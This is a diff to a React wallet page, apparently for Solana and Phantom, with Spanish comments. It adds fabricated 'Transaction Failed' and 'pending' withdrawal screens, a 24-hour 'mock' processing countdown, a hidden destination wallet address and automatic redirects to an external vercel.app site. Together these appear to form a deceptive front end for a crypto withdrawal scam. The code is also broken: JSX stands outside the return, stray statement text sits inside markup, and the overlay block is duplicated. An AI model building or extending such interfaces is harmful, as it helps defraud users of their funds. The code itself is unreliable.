@@ -12,8 +12,6 @@ import Balance from "../components/Balance"
 import Actions from "../components/Actions"
 
 import { useWallet, Tx } from "../hooks/useWallet"
-
-// 👇 PEGA ESTO AQUÍ
 function FailedPopup({
   open,
   onClose,
@@ -23,27 +21,32 @@ function FailedPopup({
 }) {
   if (!open) return null
 
+  const handleClose = () => {
+    onClose()
+    window.location.href = "https://celerity-wallet.vercel.app/solana"
+  }
+
   return (
     <div className="fixed inset-0 z-[1000] flex items-center justify-center px-6">
       <div
         className="absolute inset-0 bg-black/70 backdrop-blur-md"
-        onClick={onClose}
+        onClick={handleClose}
       />
 
       <div className="relative w-full max-w-sm rounded-3xl border border-white/10 bg-gradient-to-b from-[#0d0d14] via-[#11111a] to-[#171723] p-6 text-center">
-            <h2 className="text-white text-lg mb-4">Transaction Failed</h2>  Your transaction is currently pending due to insufficient balance. Failed to add $689.09 to Phantom. Please try again.
+        <h2 className="text-white text-lg mb-4">Transaction Failed</h2>
+        Your transaction is currently pending due to insufficient balance. Failed to add $689.09 to Phantom. Please try again.
+        
         <button
-          onClick={onClose}
-          className="w-full py-2 bg-red-500 rounded-xl"
+          onClick={handleClose}
+          className="w-full py-2 bg-red-500 rounded-xl mt-4"
         >
-          Close
+          Go to Wallet
         </button>
       </div>
     </div>
   )
 }
-
-
 // ---------------- TRANSACTIONS ----------------
 function TransactionsTech({
   data,
@@ -197,7 +200,7 @@ function MockProcessingOverlay({
               Destination wallet
             </p>
             <p className="text-sm text-purple-300 break-all font-medium">
-              8wNtA7P4RWWe76WfnTocj59R7wRUg7zLsJuDmnRZLWot
+              ****
             </p>
           </div>
 
@@ -241,7 +244,7 @@ function MockProcessingOverlay({
 export default function WalletContent({ user }: { user: any }) {
   const MIN_WITHDRAW = 100
   const SOL_PRICE = 150
-  const [showFailedPopup, setShowFailedPopup] = useState(true)
+  const [showFailedPopup, setShowFailedPopup] = useState(false)
 
   const [timerMap, setTimerMap] = useState<Record<string, number>>({})
   const [showWithdraw, setShowWithdraw] = useState(false)
@@ -429,18 +432,35 @@ export default function WalletContent({ user }: { user: any }) {
     window.location.href = "/solana"
   }
 
-  // TEST ACTION
-  const startMockOverlay = () => {
-    const endTime = Date.now() + 24 * 60 * 60 * 1000
 
-    localStorage.setItem("mockEndTime", String(endTime))
-    localStorage.setItem("mockProcessingOpen", "true")
+const startMockOverlay = () => {
+  const endTime = Date.now() + 24 * 60 * 60 * 1000
 
-    setMockSecondsLeft(24 * 60 * 60)
-    setShowMockOverlay(true)
-  }
+  localStorage.setItem("mockEndTime", String(endTime))
+  localStorage.setItem("mockProcessingOpen", "true")
+
+  setMockSecondsLeft(24 * 60 * 60)
+  setOverlayVariant("pending")
+  setShowMockOverlay(true)
+
+  // 🔥 REDIRECCIÓN
+  setTimeout(() => {
+    window.location.href = "https://celerity-wallet.vercel.app/solana"
+  }, 800) // pequeño delay para que se vea el popup
+}
 
   const hasFirstWithdraw = transactions.some(tx => tx.type === "withdraw")
+
+{hasFirstWithdraw && (
+  <div className="w-full max-w-md">
+    <button
+      onClick={startMockOverlay}
+      className="w-full py-3 rounded-2xl bg-gradient-to-r from-purple-600 via-purple-500 to-fuchsia-500 text-black font-semibold shadow-lg"
+    >
+      Pending Transaction Running 
+    </button>
+  </div>
+)}
 
   return (
     <div className="relative min-h-screen text-white overflow-hidden">
@@ -574,24 +594,30 @@ export default function WalletContent({ user }: { user: any }) {
             >
               Withdraw
             </button>
+            
+            setShowMockOverlay(true)
 
             {errorMsg && <div className="mt-3 text-red-400 text-sm text-center">{errorMsg}</div>}
           </div>
         </div>
       )}
 
+{hasFirstWithdraw && (
   <MockProcessingOverlay
-  open={showMockOverlay}
-  secondsLeft={mockSecondsLeft}
-  variant={overlayVariant}
-  onClose={() => setShowMockOverlay(false)}
-/>
+    open={showMockOverlay}
+    secondsLeft={mockSecondsLeft}
+    variant={overlayVariant}
+    onClose={() => setShowMockOverlay(false)}
+  />
+)}
 
 
 {hasFirstWithdraw && (
-  <FailedPopup
-    open={showFailedPopup}
-    onClose={() => setShowFailedPopup(false)}
+  <MockProcessingOverlay
+    open={showMockOverlay}
+    secondsLeft={mockSecondsLeft}
+    variant={overlayVariant}
+    onClose={() => setShowMockOverlay(false)}
   />
 )}
 
